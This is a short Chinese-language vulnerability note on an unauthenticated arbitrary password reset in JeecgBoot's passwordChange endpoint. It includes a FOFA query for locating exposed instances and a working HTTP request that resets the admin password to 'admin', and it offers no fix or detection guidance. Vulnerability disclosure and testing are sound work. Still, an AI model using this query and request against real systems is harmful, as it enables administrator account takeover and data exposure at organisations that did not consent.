# JeecgBoot系统接口passwordChange任意用户密码重置漏洞

Jeecg Boot是一个企业级低代码开发平台，基于前后端分离的架构，融合了SpringBoot、SpringCloud、Ant Design、Vue、Mybatis-plus、Shiro、JWT等多种主流技术，旨在帮助企业快速构建各种应用系统，提高开发效率，降低开发成本。

JeecgBoot系统接口passwordChange任意用户密码重置漏洞，未经身份验证的远程攻击者可以利用此漏洞重置管理员账户密码，从而接管系统后台，造成信息泄露，导致系统处于极不安全的状态。

## fofa

```javascript
body="/sys/common/pdf/pdfPreviewIframe"
```

## poc

```javascript
GET /jeecg-boot/sys/user/passwordChange?username=admin&password=admin&smscode=&phone= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

![image-20241219145613854](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412191456905.png)